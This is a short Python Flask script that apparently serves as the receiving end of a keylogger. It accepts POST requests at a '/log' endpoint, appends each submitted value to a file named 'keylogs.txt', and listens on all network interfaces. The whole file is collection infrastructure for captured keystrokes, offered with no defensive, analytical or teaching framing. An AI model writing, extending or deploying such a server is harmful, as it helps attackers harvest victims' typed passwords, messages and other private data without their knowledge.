from flask import Flask, request

app = Flask(__name__)

@app.route("/log", methods=["POST"])
def log():
    log_data = request.form.get("log")
    with open("keylogs.txt", "a") as file:
        file.write(log_data + "\n")
    return "Log received", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
